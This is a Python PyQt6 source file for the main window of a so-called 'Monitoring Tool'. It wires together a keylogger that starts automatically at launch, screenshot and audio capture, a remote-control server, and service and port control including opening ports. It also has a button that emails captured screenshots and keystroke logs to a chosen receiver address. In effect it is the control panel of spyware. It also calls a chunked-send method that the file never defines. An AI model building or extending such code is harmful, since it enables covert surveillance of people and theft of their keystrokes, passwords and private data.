import logging
from modules.email_screenshot_log import ScreenshotKeylogSender
from PyQt6.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                            QPushButton, QTextEdit, QGroupBox, QLabel,
                            QLineEdit, QTabWidget, QMessageBox, QFileDialog)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QObject
from PyQt6.QtGui import QIntValidator
import platform
from datetime import datetime
from pathlib import Path

# Import all modules
from modules.keylogger import KeyLogger
from modules.network_info import NetworkInfoCollector
from modules.screenshot import ScreenshotCapture
from modules.audio_recorder import AudioRecorder
from modules.remote_control import RemoteControlServer
from modules.service_control import ServiceController
from modules.port_control import PortController
from modules.email_sender import EmailSender
from config.settings import KILL_SWITCH

class WorkerSignals(QObject):
    finished = pyqtSignal(str)
    error = pyqtSignal(str)

class WorkerThread(QThread):
    """Thread for running tasks in the background."""
    def __init__(self, task_func, *args, **kwargs):
        super().__init__()
        self.task_func = task_func
        self.args = args
        self.kwargs = kwargs
        self.signals = WorkerSignals()

    def run(self):
        try:
            result = self.task_func(*self.args, **self.kwargs)
            self.signals.finished.emit(str(result))
        except Exception as e:
            self.signals.error.emit(str(e))

class MainWindow(QMainWindow):
    """Main application window."""
    
    def __init__(self, dirs, parent=None):
        super().__init__(parent)
        self.dirs = dirs
        self.worker_threads = []
        
        # Initialize modules
        self.keylogger = KeyLogger()
        self.network_collector = NetworkInfoCollector()
        self.screenshot_capture = ScreenshotCapture()
        self.audio_recorder = AudioRecorder()
        self.remote_control = RemoteControlServer()
        self.service_controller = ServiceController()
        self.port_controller = PortController()
        self.screenshot_keylog_sender = ScreenshotKeylogSender(
            self.dirs['screenshots'],
            self.keylogger.log_file
        )
       
        # Track pressed keys for kill switch
        self.pressed_keys = set()
        
        # Setup UI
        self.setup_ui()
        self.setup_menu()
        
        logging.info("Main window initialized")

    def setup_ui(self):
        """Setup the main user interface."""
        self.setWindowTitle("Monitoring Tool")
        self.resize(1200, 800)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        
        # Tab widget
        self.tab_widget = QTabWidget()
        main_layout.addWidget(self.tab_widget)
        
        # Add tabs
        self.setup_monitoring_tab()
        self.setup_remote_tab()
        self.setup_services_tab()
        self.setup_ports_tab()
        self.setup_email_tab()
        
        # Start keylogger by default
        self.toggle_keylogger()

    def setup_monitoring_tab(self):
        """Setup the monitoring tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Keylogger group
        keylogger_group = QGroupBox("Keylogger")
        keylogger_layout = QHBoxLayout()
        self.keylogger_toggle = QPushButton("Stop Keylogger")
        self.keylogger_toggle.clicked.connect(self.toggle_keylogger)
        keylogger_layout.addWidget(self.keylogger_toggle)
        keylogger_group.setLayout(keylogger_layout)
        layout.addWidget(keylogger_group)
        
        # Screenshot group
        screenshot_group = QGroupBox("Screenshot")
        screenshot_layout = QHBoxLayout()
        capture_btn = QPushButton("Capture Screenshot")
        capture_btn.clicked.connect(self.capture_screenshot)
        screenshot_layout.addWidget(capture_btn)
        capture_all_btn = QPushButton("Capture All Monitors")
        capture_all_btn.clicked.connect(self.capture_all_screenshots)
        screenshot_layout.addWidget(capture_all_btn)
        screenshot_group.setLayout(screenshot_layout)
        layout.addWidget(screenshot_group)
        
        # Audio group
        audio_group = QGroupBox("Audio Recording")
        audio_layout = QHBoxLayout()
        self.audio_toggle = QPushButton("Start Audio Recording")
        self.audio_toggle.clicked.connect(self.toggle_audio_recording)
        audio_layout.addWidget(self.audio_toggle)
        audio_group.setLayout(audio_layout)
        layout.addWidget(audio_group)
        
        # Network info group
        network_group = QGroupBox("Network Information")
        network_layout = QVBoxLayout()
        self.network_info = QTextEdit()
        self.network_info.setReadOnly(True)
        network_layout.addWidget(self.network_info)
        refresh_btn = QPushButton("Refresh Network Info")
        refresh_btn.clicked.connect(self.refresh_network_info)
        network_layout.addWidget(refresh_btn)
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        self.tab_widget.addTab(tab, "Monitoring")

    def setup_remote_tab(self):
        """Setup the remote control tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Remote control status
        status_group = QGroupBox("Remote Control")
        status_layout = QVBoxLayout()
        self.remote_status = QLabel("Status: Stopped")
        status_layout.addWidget(self.remote_status)
        self.remote_toggle = QPushButton("Start Remote Control")
        self.remote_toggle.clicked.connect(self.toggle_remote_control)
        status_layout.addWidget(self.remote_toggle)
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        # Connection info
        info_group = QGroupBox("Connection Information")
        info_layout = QVBoxLayout()
        self.remote_info = QTextEdit()
        self.remote_info.setReadOnly(True)
        info_layout.addWidget(self.remote_info)
        status_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        self.tab_widget.addTab(tab, "Remote Control")

    def setup_services_tab(self):
        """Setup the services tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Service control
        control_group = QGroupBox("Service Control")
        control_layout = QVBoxLayout()
        
        # Service selection
        service_layout = QHBoxLayout()
        service_layout.addWidget(QLabel("Service Name:"))
        self.service_input = QLineEdit()
        service_layout.addWidget(self.service_input)
        control_layout.addLayout(service_layout)
        
        # Buttons
        btn_layout = QHBoxLayout()
        start_btn = QPushButton("Start")
        start_btn.clicked.connect(self.start_service)
        btn_layout.addWidget(start_btn)
        
        stop_btn = QPushButton("Stop")
        stop_btn.clicked.connect(self.stop_service)
        btn_layout.addWidget(stop_btn)
        
        restart_btn = QPushButton("Restart")
        restart_btn.clicked.connect(self.restart_service)
        btn_layout.addWidget(restart_btn)
        
        control_layout.addLayout(btn_layout)
        control_group.setLayout(control_layout)
        layout.addWidget(control_group)
        
        # Common services
        common_group = QGroupBox("Common Services")
        common_layout = QVBoxLayout()
        
        # Add common service buttons here...
        
        common_group.setLayout(common_layout)
        layout.addWidget(common_group)
        
        # Service status
        status_group = QGroupBox("Service Status")
        status_layout = QVBoxLayout()
        self.service_status = QTextEdit()
        self.service_status.setReadOnly(True)
        status_layout.addWidget(self.service_status)
        refresh_btn = QPushButton("Refresh Status")
        refresh_btn.clicked.connect(self.refresh_service_status)
        status_layout.addWidget(refresh_btn)
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        self.tab_widget.addTab(tab, "Services")

    def setup_ports_tab(self):
        """Setup the ports tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Port control
        control_group = QGroupBox("Port Control")
        control_layout = QVBoxLayout()
        
        # Port selection
        port_layout = QHBoxLayout()
        port_layout.addWidget(QLabel("Port Number:"))
        self.port_input = QLineEdit()
        self.port_input.setValidator(QIntValidator(1, 65535))
        port_layout.addWidget(self.port_input)
        control_layout.addLayout(port_layout)
        
        # Buttons
        btn_layout = QHBoxLayout()
        open_btn = QPushButton("Open Port")
        open_btn.clicked.connect(self.open_port)
        btn_layout.addWidget(open_btn)
        
        close_btn = QPushButton("Close Port")
        close_btn.clicked.connect(self.close_port)
        btn_layout.addWidget(close_btn)
        
        check_btn = QPushButton("Check Status")
        check_btn.clicked.connect(self.check_port_status)
        btn_layout.addWidget(check_btn)
        
        control_layout.addLayout(btn_layout)
        control_group.setLayout(control_layout)
        layout.addWidget(control_group)
        
        # Common ports
        common_group = QGroupBox("Common Ports")
        common_layout = QVBoxLayout()
        
        # Add common port buttons here...
        
        common_group.setLayout(common_layout)
        layout.addWidget(common_group)
        
        # Port status
        status_group = QGroupBox("Port Status")
        status_layout = QVBoxLayout()
        self.port_status = QTextEdit()
        self.port_status.setReadOnly(True)
        status_layout.addWidget(self.port_status)
        refresh_btn = QPushButton("Refresh Status")
        refresh_btn.clicked.connect(self.refresh_port_status)
        status_layout.addWidget(refresh_btn)
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        self.tab_widget.addTab(tab, "Ports")

    def setup_email_tab(self):
        """Setup the email tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Email configuration
        config_group = QGroupBox("Email Configuration")
        config_layout = QVBoxLayout()
        
        # Sender email
        sender_layout = QHBoxLayout()
        sender_layout.addWidget(QLabel("Sender Email:"))
        self.sender_email = QLineEdit()
        sender_layout.addWidget(self.sender_email)
        config_layout.addLayout(sender_layout)
        
        # Sender password
        pass_layout = QHBoxLayout()
        pass_layout.addWidget(QLabel("Password:"))
        self.sender_password = QLineEdit()
        self.sender_password.setEchoMode(QLineEdit.EchoMode.Password)
        pass_layout.addWidget(self.sender_password)
        config_layout.addLayout(pass_layout)
        
        # SMTP server
        server_layout = QHBoxLayout()
        server_layout.addWidget(QLabel("SMTP Server:"))
        self.smtp_server = QLineEdit()
        server_layout.addWidget(self.smtp_server)
        config_layout.addLayout(server_layout)
        
        # SMTP port
        port_layout = QHBoxLayout()
        port_layout.addWidget(QLabel("SMTP Port:"))
        self.smtp_port = QLineEdit()
        self.smtp_port.setValidator(QIntValidator(1, 65535))
        port_layout.addWidget(self.smtp_port)
        config_layout.addLayout(port_layout)
        
        # Receiver email
        receiver_layout = QHBoxLayout()
        receiver_layout.addWidget(QLabel("Receiver Email:"))
        self.receiver_email = QLineEdit()
        receiver_layout.addWidget(self.receiver_email)
        config_layout.addLayout(receiver_layout)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Email actions
        action_group = QGroupBox("Actions")
        action_layout = QHBoxLayout()
        
        test_btn = QPushButton("Send Test Email")
        test_btn.clicked.connect(self.send_test_email)
        action_layout.addWidget(test_btn)
        
        send_btn = QPushButton("Send Collected Data")
        send_btn.clicked.connect(self.send_collected_data)
        action_layout.addWidget(send_btn)
        
        action_group.setLayout(action_layout)
        layout.addWidget(action_group)
        
        self.tab_widget.addTab(tab, "Email")

    def setup_menu(self):
        """Setup the menu bar."""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("File")
        exit_action = file_menu.addAction("Exit")
        exit_action.triggered.connect(self.close)
        
        # Help menu
        help_menu = menubar.addMenu("Help")
        about_action = help_menu.addAction("About")
        about_action.triggered.connect(self.show_about)

    # ===== Monitoring Tab Functions =====
    def toggle_keylogger(self):
        """Toggle keylogger on/off."""
        if self.keylogger.is_running():
            self.keylogger.stop()
            self.keylogger_toggle.setText("Start Keylogger")
        else:
            self.keylogger.start()
            self.keylogger_toggle.setText("Stop Keylogger")

    def capture_screenshot(self):
        """Capture screenshot of primary monitor."""
        self.run_in_thread(
            self.screenshot_capture.capture,
            lambda result: self.show_status(f"Screenshot saved: {result}"),
            "Error capturing screenshot"
        )

    def capture_all_screenshots(self):
        """Capture screenshots of all monitors."""
        self.run_in_thread(
            self.screenshot_capture.capture_all,
            lambda result: self.show_status(f"Screenshots saved: {result}"),
            "Error capturing screenshots"
        )

    def toggle_audio_recording(self):
        """Toggle audio recording on/off."""
        if self.audio_recorder.is_recording():
            self.audio_recorder.stop()
            self.audio_toggle.setText("Start Audio Recording")
        else:
            self.audio_recorder.start()
            self.audio_toggle.setText("Stop Audio Recording")

    def refresh_network_info(self):
        """Refresh and display network information."""
        self.run_in_thread(
            self.network_collector.collect_info,
            lambda result: self.network_info.setPlainText(result),
            "Error refreshing network info"
        )

    # ===== Remote Control Tab Functions =====
    def toggle_remote_control(self):
        """Toggle remote control server on/off."""
        if self.remote_control.is_running():
            self.remote_control.stop()
            self.remote_toggle.setText("Start Remote Control")
            self.remote_status.setText("Status: Stopped")
        else:
            self.remote_control.start()
            self.remote_toggle.setText("Stop Remote Control")
            self.remote_status.setText("Status: Running")

    # ===== Services Tab Functions =====
    def start_service(self):
        """Start the specified service."""
        service = self.service_input.text().strip()
        if not service:
            self.show_error("Please enter a service name")
            return
            
        self.run_in_thread(
            lambda: self.service_controller.start_service(service),
            lambda result: self.show_status(result),
            f"Error starting service {service}"
        )

    def stop_service(self):
        """Stop the specified service."""
        service = self.service_input.text().strip()
        if not service:
            self.show_error("Please enter a service name")
            return
            
        self.run_in_thread(
            lambda: self.service_controller.stop_service(service),
            lambda result: self.show_status(result),
            f"Error stopping service {service}"
        )

    def restart_service(self):
        """Restart the specified service."""
        service = self.service_input.text().strip()
        if not service:
            self.show_error("Please enter a service name")
            return
            
        self.run_in_thread(
            lambda: self.service_controller.restart_service(service),
            lambda result: self.show_status(result),
            f"Error restarting service {service}"
        )

    def refresh_service_status(self):
        """Refresh service status display."""
        self.run_in_thread(
            self.service_controller.get_status,
            lambda result: self.service_status.setPlainText(result),
            "Error refreshing service status"
        )

    # ===== Ports Tab Functions =====
    def open_port(self):
        """Open the specified port."""
        port = self.port_input.text().strip()
        if not port:
            self.show_error("Please enter a port number")
            return
            
        self.run_in_thread(
            lambda: self.port_controller.open_port(int(port)),
            lambda result: self.show_status(result),
            f"Error opening port {port}"
        )

    def close_port(self):
        """Close the specified port."""
        port = self.port_input.text().strip()
        if not port:
            self.show_error("Please enter a port number")
            return
            
        self.run_in_thread(
            lambda: self.port_controller.close_port(int(port)),
            lambda result: self.show_status(result),
            f"Error closing port {port}"
        )

    def check_port_status(self):
        """Check status of the specified port."""
        port = self.port_input.text().strip()
        if not port:
            self.show_error("Please enter a port number")
            return
            
        self.run_in_thread(
            lambda: self.port_controller.check_port(int(port)),
            lambda result: self.show_status(result),
            f"Error checking port {port}"
        )

    def refresh_port_status(self):
        """Refresh port status display."""
        self.run_in_thread(
            self.port_controller.get_status,
            lambda result: self.port_status.setPlainText(result),
            "Error refreshing port status"
        )

    # ===== Email Tab Functions =====
    def send_test_email(self):
        """Send a test email."""
        email_config = self._get_email_config()
        if not email_config:
            return
            
        self.run_in_thread(
            lambda: self._send_test_email(email_config),
            lambda result: self.show_status(result),
            "Error sending test email"
        )

    def _send_test_email(self, email_config):
        """Internal method to send test email"""
        try:
            # Create a simple test email sender instance
            sender = EmailSender()
            return sender.send_email(
                email_config['sender_email'],
                email_config['sender_password'],
                email_config['smtp_server'],
                email_config['smtp_port'],
                email_config['receiver_email'],
                "Test Email from Monitoring Tool",
                "This is a test email from the Monitoring Tool",
                []
            )
        except Exception as e:
            return f"Error: {str(e)}"

    def send_collected_data(self):
        """Send all collected data via email with size management."""
        email_config = self._get_email_config()
        if not email_config:
            return
            
        # First try sending just screenshots and keylogs
        self.run_in_thread(
            lambda: self.screenshot_keylog_sender.send_latest(email_config),
            lambda result: self._handle_send_result(result, email_config),
            "Error sending collected data"
        )

    def _handle_send_result(self, result, email_config):
        """Handle result of initial send attempt."""
        if "Error" not in result:
            self.show_status(result)
        else:
            # If failed due to size, try chunked sending
            self.run_in_thread(
                lambda: self._send_all_chunked(email_config),
                lambda result: self.show_status(result),
                "Error sending chunked data"
            )


    def _get_email_config(self):
        """Helper to get email config from UI"""
        config = {
            'sender_email': self.sender_email.text().strip(),
            'sender_password': self.sender_password.text().strip(),
            'smtp_server': self.smtp_server.text().strip(),
            'smtp_port': self.smtp_port.text().strip(),
            'receiver_email': self.receiver_email.text().strip()
        }
        
        try:
            config['smtp_port'] = int(config['smtp_port'])
        except ValueError:
            self.show_error("Invalid SMTP port")
            return None
            
        if not all(config.values()):
            self.show_error("Please fill all email fields")
            return None
            
        return config    
   

    # ===== Utility Methods =====
    def run_in_thread(self, task_func, success_callback, error_msg, *args):
        """Run a task in a background thread."""
        worker = WorkerThread(task_func, *args)
        worker.signals.finished.connect(success_callback)
        worker.signals.error.connect(lambda e: self.show_error(f"{error_msg}: {e}"))
        worker.finished.connect(worker.deleteLater)
        self.worker_threads.append(worker)
        worker.start()

    def show_status(self, message):
        """Show a status message."""
        QMessageBox.information(self, "Status", message)

    def show_error(self, message):
        """Show an error message."""
        QMessageBox.critical(self, "Error", message)

    def show_about(self):
        """Show about dialog."""
        QMessageBox.about(self, "About", 
                         "Monitoring Tool\nVersion 1.0\n\nA comprehensive system monitoring application")

    def cleanup_threads(self):
        """Clean up all worker threads."""
        for thread in self.worker_threads:
            if thread.isRunning():
                thread.quit()
                thread.wait()
        self.worker_threads.clear()

    def closeEvent(self, event):
        """Handle window close event."""
        # Stop all monitoring activities
        if self.keylogger.is_running():
            self.keylogger.stop()
            
        if self.audio_recorder.is_recording():
            self.audio_recorder.stop()
            
        if self.remote_control.is_running():
            self.remote_control.stop()
            
        # Clean up threads
        self.cleanup_threads()
        
        event.accept()